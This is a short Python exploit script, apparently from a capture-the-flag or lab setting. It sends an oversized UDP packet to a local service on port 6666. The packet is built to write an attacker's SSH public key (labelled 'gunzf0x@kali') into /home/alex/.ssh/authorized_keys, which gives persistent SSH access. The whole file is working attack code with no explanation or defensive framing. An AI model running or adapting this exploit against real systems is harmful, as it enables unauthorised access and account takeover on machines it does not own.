import socket

server_address = ('::1',6666)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server_address)

data = bytearray(b'\n'*65403)

key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SiyCewbhjiQFyM7O3KUegCw93nJ0VwauHuhZo4F2gBC5gPqEpYOKIA1rPWELhOlsUr5WsFvV3tgyCIciI5aqHRBE0rD2eMZEgI1DnrQ+aKkjchx673VSdB6L1NTPXpD8HQnHHwX06FCgTk01Wa6J7iqFZfUB10jalj4rol0OVpk9TTwZjU3gpZ5P/er1jdOykrfzXSVi51fgnQR2audfshPFL40EQm0AWdxdfqANSbpLS886eoLWttHGXtPVvuXvWVJGCyTft9d0issxBBOxH09g1WgEPbmOj7V8FIGPvzUPTAOUHDJ/gOOuAEWTdBY6LueK3DomCpo/YwjTgW6PLSSdWzN7/8yiBKek6ls91CWVLEbCdGRH446Dt5Pgr0ehy2GdeO0BXNWxAb6vHDxnQlzgeAH2WW2m2eAvGcYANApNJv1tdAZ+4r8V02OEHM6fYiYpvJUX0if/sQkblR8LJuRSr36I+Mo5pUBleHBUrqkVb/qsEjFYkXjiAOc+rQM= gunzf0x@kali'

replace = b"/home/alex/.ssh/authorized_keys"

sendData = data[:65372] + replace
sendData[12:12+len(key)] = key.encode()

s.send(sendData)
